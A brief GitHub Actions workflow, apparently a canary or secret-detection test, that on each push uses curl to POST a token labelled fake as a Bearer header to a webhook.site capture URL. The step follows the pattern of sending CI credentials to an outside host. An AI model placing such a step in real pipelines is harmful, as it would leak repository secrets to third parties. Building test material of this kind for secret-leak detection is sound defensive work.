name: Test Workflow

on: [push]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Simulate token usage via curl
        env:
          FAKE_TOKEN: ghp_fakeCanaryToken123456
        run: |
          curl -X POST "https://webhook.site/95479abb-70bb-401b-b70a-453912926c68" \
            -H "Authorization: Bearer $FAKE_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"message":"Simulated token usage from GitHub Actions"}'
